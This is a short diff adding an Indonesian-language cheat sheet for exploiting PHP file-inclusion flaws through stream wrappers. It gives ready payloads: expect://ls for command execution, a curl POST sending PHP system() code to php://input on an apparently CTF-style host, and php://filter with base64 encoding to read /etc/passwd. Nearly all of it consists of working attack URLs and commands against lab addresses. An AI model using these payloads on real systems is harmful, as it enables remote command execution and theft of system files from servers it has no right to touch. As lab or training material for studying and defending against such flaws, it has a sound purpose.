@@ -1,0 +1,21 @@
+Mengizinkan eksekusi perintah sistem melalui code php, sayangnya ini tidak diaktifkan secara default.
+
+http://127.0.0.1/fileincl/example1.php?page=expect://ls
+expect://ls
+
+==================================================================================================================
+
+Pembungkus PHP lain, php://input dikirim dalam permintaan POST menggunakan curl, 
+sendawa atau hackbar untuk memberikan data pos mungkin merupakan opsi termudah.
+
+http://192.168.183.128/fileincl/example1.php?page=php://input
+
+Payload Post data, coba sesuatu yang sederhana untuk memulai dengan seperti:
+
+curl -X POST --data "<?php system('ls'); ?>" http://not.codepwnda.id:30469/?page=php://input
+
+=================================================================================================================
+
+Wrapper PHP lain, php://filter dalam contoh ini output disandikan menggunakan base64, jadi Anda harus mendekode output.
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+
